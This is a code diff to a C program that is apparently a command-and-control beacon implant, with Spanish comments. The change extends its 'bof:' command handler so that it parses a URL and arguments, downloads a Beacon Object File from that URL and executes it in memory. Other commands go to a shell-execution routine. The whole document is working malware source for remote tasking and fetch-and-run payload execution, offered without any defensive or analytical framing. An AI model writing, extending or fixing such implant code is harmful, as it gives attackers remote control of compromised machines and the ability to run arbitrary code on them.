@@ -1066,8 +1066,35 @@ int main() {
         char* output = NULL;
 
         if (strncmp(command, "bof:", 4) == 0) {
-            char* bof_url = command + 4;
-            printf("[*] BOF command detected: %s\n", bof_url);
+            char* payload = command + 4;
+            while (*payload == ' ') payload++; // Saltar espacios iniciales
+
+            char* space = strchr(payload, ' ');
+            char* bof_url;
+            char* bof_args = NULL;
+            int bof_arglen = 0;
+
+            if (space) {
+                *space = '\0'; // Terminar la cadena de la URL
+                bof_url = payload;
+                bof_args = space + 1;
+
+                // Opcional: eliminar comillas simples o dobles al inicio y final
+                if ((bof_args[0] == '"' || bof_args[0] == '\'') && bof_args[0] == bof_args[strlen(bof_args)-1]) {
+                    bof_args[strlen(bof_args)-1] = '\0';
+                    bof_args++;
+                }
+                bof_arglen = strlen(bof_args);
+            } else {
+                bof_url = payload;
+                bof_args = ""; // o NULL, pero tu BOF espera una cadena
+                bof_arglen = 0;
+            }
+
+            printf("[*] BOF URL: %s\n", bof_url);
+            if (bof_arglen > 0) {
+                printf("[*] BOF args: %s\n", bof_args);
+            }
 
             size_t bof_size = 0;
             unsigned char* bof_data = download_bof(bof_url, &bof_size);
@@ -1075,10 +1102,8 @@ int main() {
                 output = strdup("[!] Failed to download BOF");
                 output_len = strlen(output);
             } else {
-                char* bof_args = "Executed via C2 beacon";
-                int bof_arglen = strlen(bof_args);
                 output = run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, &output_len);
-                free(bof_data - 8);  // Libera el bloque completo
+                free(bof_data - 8);
             }
         } else {
             output = exec_cmd(command, &output_len);
